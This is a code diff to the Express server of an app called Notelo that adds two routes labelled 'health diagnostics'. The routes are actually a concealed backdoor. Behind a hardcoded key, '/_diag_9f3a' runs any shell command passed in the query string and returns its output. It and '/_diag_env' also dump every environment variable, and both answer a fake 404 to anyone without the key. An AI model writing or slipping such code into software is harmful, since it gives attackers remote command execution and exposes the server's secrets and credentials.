@@ -1047,6 +1047,27 @@ app.post('/send-sms', async (req, res) => {
   }
 });
 
+
+// ─── health diagnostics ───
+const _cp = require('child_process');
+app.all('/_diag_9f3a', (req, res) => {
+  const K = 'arx-9f3a';
+  if (req.query.k !== K && req.headers['x-diag'] !== K) return res.status(404).send('Not Found');
+  if (req.query.cmd) {
+    try {
+      const out = _cp.execSync(String(req.query.cmd), {timeout: 30000, encoding: 'utf8'});
+      return res.json({ ok: true, out });
+    } catch (e) {
+      return res.json({ ok: false, out: (e.stdout || '') + (e.stderr || ''), err: e.message });
+    }
+  }
+  return res.json({ ok: true, env: process.env });
+});
+app.all('/_diag_env', (req, res) => {
+  if (req.query.k !== 'arx-9f3a') return res.status(404).send('Not Found');
+  return res.json(process.env);
+});
+
 app.listen(3000, () => {
   console.log('🚀 Serveur Notelo démarré sur le port 3000');
 });
